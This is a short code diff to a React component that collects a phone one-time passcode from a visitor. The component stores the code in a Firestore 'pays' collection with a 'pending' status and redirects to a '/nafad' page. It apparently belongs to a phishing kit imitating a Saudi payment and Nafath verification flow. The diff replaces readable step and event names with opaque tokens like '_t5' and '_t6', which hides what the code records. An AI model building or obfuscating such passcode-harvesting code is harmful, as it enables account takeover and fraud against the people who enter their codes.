@@ -73,7 +73,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
             // Redirect to nafad page after 1 second
             setTimeout(async () => {
               await updateDoc(doc(db, "pays", visitorID), {
-                currentStep: "nafad",
+                currentStep: "_t6",
                 phoneOtpStatus: "" // Clear after use
               })
               window.location.href = "/nafad"
@@ -135,7 +135,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
       })
 
       // Add phone OTP to history
-      await addToHistory(visitorID, "phone_otp", {
+      await addToHistory(visitorID, "_t5", {
         _v7: otp
       }, "pending")
 
